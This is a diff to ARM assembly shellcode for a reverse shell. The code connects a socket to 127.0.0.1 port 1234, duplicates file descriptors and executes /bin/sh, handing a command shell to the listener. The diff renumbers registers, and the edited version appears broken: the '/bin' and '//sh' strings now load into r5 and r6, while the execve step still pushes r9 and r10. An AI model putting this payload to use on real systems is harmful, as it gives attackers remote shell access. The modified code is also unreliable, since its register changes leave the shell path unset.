@@ -11,14 +11,14 @@
 _start:
 
     .code 32
-    ldr    r4,  =#0xD402FF02 // htons(1234), AF_INET
-    ldr    r5,  =#0x0100007f // 127.0.0.1
-    ldr    r9,  =#0x6e69622f // /bin
-    ldr    r10, =#0x68732f2f // //sh
+    ldr    r3, =#0xD402FF02 // htons(1234), AF_INET
+    ldr    r4, =#0x0100007f // 127.0.0.1
+    ldr    r5, =#0x6e69622f // /bin
+    ldr    r6, =#0x68732f2f // //sh
 
     // switch to thumb mode    
-    add    r3, pc, #1
-    bx     r3 
+    add    r0, pc, #1
+    bx     r0 
   
     .code 16
     // s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
@@ -32,7 +32,7 @@ _start:
     mov    r8, r0       // r8 = s
     
     // connect(s, &sa, sizeof(sa));
-    push   {r4, r5}     // save sa on stack
+    push   {r3, r4}     // save sa on stack
     mov    r1, sp       // r1 = &sa
     strb   r2, [r1, #1] // null the 0xFF in sa.family
     mov    r2, #16      // r2 = sizeof(sa)
@@ -51,8 +51,8 @@ c_dup:
     bne    c_dup       // while (r1 != 0)
 
     // execve("/bin/sh", NULL, NULL);
-    mov    r11, r2
-    push   {r9, r10, r11}
+    mov    r7, r2
+    push   {r9, r10, r7}
     mov    r0, sp  
     mov    r7, #11       // r7 = execve
     svc    1
